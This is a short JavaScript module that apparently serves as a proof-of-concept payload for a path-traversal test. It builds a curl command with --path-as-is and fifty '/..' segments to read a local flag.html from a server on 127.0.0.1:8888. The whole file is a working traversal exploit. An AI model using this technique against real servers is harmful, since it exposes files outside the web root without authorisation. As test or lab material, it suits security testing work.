function getPayload() {
  const pathToFlag = path.resolve(__dirname, "../flag.html");
  function genstr(n) {
    return "/..".repeat(50) + pathToFlag;
  }
  return {
    attack_string: `curl -v --path-as-is "http://127.0.0.1:8888${genstr()}"`
  };
}

module.exports = { getPayload };